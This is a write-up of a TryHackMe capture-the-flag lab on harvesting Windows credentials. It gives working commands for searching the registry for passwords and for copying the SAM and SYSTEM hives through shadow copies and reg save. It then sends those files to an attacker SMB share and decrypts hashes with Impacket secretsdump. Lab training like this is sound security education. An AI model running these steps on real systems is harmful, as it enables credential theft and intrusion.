# Credentials Harvesting

**Room Link:** [https://tryhackme.com/room/credharvesting](https://tryhackme.com/room/credharvesting)

## Credential Access



### Clear-text files

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path:&#x20;

```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.

**Victim(cmd)**

```
reg query HKLM /f password /t REG_SZ /s
OR
reg query HKCU /f password /t REG_SZ /s
```



**Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?**

**Victim(cmd)**

```
reg query HKLM /f password /t REG_SZ /s > results.txt
findstr "flag" results.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>



**Enumerate the AD environment we provided. What is the password of the victim user found in the description section?**

**Victim(cmd)**

```
powershell
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

## Local Windows Credentials

The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.&#x20;

First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the `c:\Windows\System32\config\sam` file:

**Victim(cmd)**

```
type c:\Windows\System32\config\sam
copy c:\Windows\System32\config\sam C:\Users\thm\Desktop\ 
```

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Metasploit's HashDump

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the [rapid7 ](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/)blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!



## Volume Shadow Copy Service

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:

**Victim(cmd)**

```
wmic shadowcopy call create Volume='C:\'
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.&#x20;

**Victim(cmd)**

```
vssadmin list shadows
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system.

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

**Victim(cmd)**

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\thm\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\thm\Desktop\system
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).

## Registry Hives

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.

**Victim(cmd)**

```
reg save HKLM\sam C:\users\thm\Desktop\sam-reg
reg save HKLM\system C:\users\thm\Desktop\system-reg
```

Let's this time decrypt it using one of the Impacket tools: `secretsdump.py`, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.

Move both SAM and system files to the AttackBox and run the following command:

**Kali**

```
mkdir public
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 smb public/
```

**Victim(cmd)**

```
net use \\$KALI\smb
copy C:\users\thm\Desktop\sam-reg \\$KALI\smb
copy C:\users\thm\Desktop\system-reg \\$KALI\smb
copy C:\users\thm\Desktop\sam \\$KALI\smb
copy C:\users\thm\Desktop\system \\$KALI\smb
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**Kali**&#x20;

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## Local Security Authority Subsystem Service (LSASS)

### Graphic User Interface (GUI)

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".

![](<../../.gitbook/assets/image (7).png>)
